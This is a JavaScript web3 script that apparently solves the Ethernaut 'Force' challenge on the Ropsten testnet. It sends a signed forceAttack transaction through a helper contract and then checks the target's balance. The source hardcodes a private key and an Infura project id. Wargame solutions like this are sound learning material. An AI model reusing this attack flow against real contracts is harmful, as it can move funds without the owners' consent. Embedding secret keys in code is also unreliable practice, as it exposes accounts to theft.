import Web3 from 'web3';
import fs from 'fs';
import path from 'path';
import { debugEthernaut, debugError } from './config/debug';

const infuraProvider = 'https://ropsten.infura.io/v3/ba374d41ee3f4c65ab05c31c4dd452f6';
const web3 = new Web3(infuraProvider);
const privateKey = '0x1D5906FCC19C3641DF21665D42138610A8BC33D6735BB5D06C387AE08B9CC081';
const account = web3.eth.accounts.privateKeyToAccount(privateKey);

const solArtifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/ForceSol.json')));
const artifact = JSON.parse(fs.readFileSync(path.resolve(__dirname, '../build/contracts/Telephone.json')));
const address = '0xeDa14354C69067B1BA2D932627efD343518F820a';
const solAddress = solArtifact.networks['3'].address;
debugEthernaut('solAddress', solAddress);
const solContract = new web3.eth.Contract(solArtifact.abi, solAddress);
const contract = new web3.eth.Contract(artifact.abi, address);

const ethernaut = async () => {
  try {
    const estimatedGas = await solContract.methods.forceAttack(address).estimateGas();
    debugEthernaut('estimated gas', estimatedGas);
    const transactionData = await solContract.methods.forceAttack(address).encodeABI();
    debugEthernaut('data', transactionData);
    const transaction = {
      from: account.address,
      to: solAddress,
      data: transactionData,
      gasLimit: estimatedGas * 100,
      // gasPrice: utils.toWei(20, 'Gwei'),
    };

    // Sign transaction
    const signedTx = await account.signTransaction(transaction);
    debugEthernaut('signedTx:\n', signedTx);
    const txResult = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
    debugEthernaut('txResult:\n', txResult);
    const contractBalance = await web3.eth.getBalance(address);
    debugEthernaut('contractBalance', contractBalance);
  } catch (error) {
    debugError(error);
  }
};

ethernaut();
